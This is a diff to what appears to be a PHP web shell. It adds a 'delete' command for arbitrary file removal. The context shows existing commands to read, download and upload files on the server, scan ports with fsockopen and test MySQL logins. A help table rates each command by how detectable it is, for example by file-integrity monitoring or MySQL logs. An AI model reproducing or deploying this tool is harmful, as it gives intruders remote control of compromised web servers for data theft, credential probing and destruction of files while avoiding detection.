@@ -66,6 +66,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['act'])) {
                     $out .= "\nOwner: ".(isset($u['name'])?$u['name']:'?').":".(isset($g['name'])?$g['name']:'?');
                 }
                 break;
+            case 'delete':
+                if (is_file($target)) {
+                    $out = @unlink($target) ? "File deleted: $target" : "Error: Could not delete file.";
+                } elseif (is_dir($target)) {
+                    $out = "Safety Error: Directory deletion not allowed.";
+                } else {
+                    $out = "Error: File not found.";
+                }
+                break;
             case 'port_scan':
                 $hp = explode(':', $target); 
                 $c = @fsockopen($hp[0], isset($hp[1]) ? $hp[1] : 80, $en, $es, 2);
@@ -121,6 +130,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['act'])) {
                     array('stat [path]', 'Check permission', 'stat /var/www/html', 'Low: Native metadata syscall'),
                     array('read [file]', 'Read file', 'read /var/www/html/config.php', 'Low: Internal PHP stream read'),
                     array('find [path] [keyword]', 'Search for filename', 'find /var/www config', 'Med: High CPU/Disk IO if path is large'),
+                    array('delete [path]', 'Delete file', 'delete /tmp/test.txt', 'High: File deletion.  Detectable by FIM'),
                     array('download [file]', 'Download file', 'download /var/www/html/config.php', 'Med: File transfer in HTTP logs'),
                     array('upload [path] [b64]', 'Upload file', 'upload /var/www/html/test.txt b64', 'High: Disk write. Detectable by FIM'),
                     array('db_auth [h:p] [u] [p]', 'MySQL auth', 'db_auth 127.0.0.1:3306 root pass', 'Med: Failed logins logged by MySQL'),
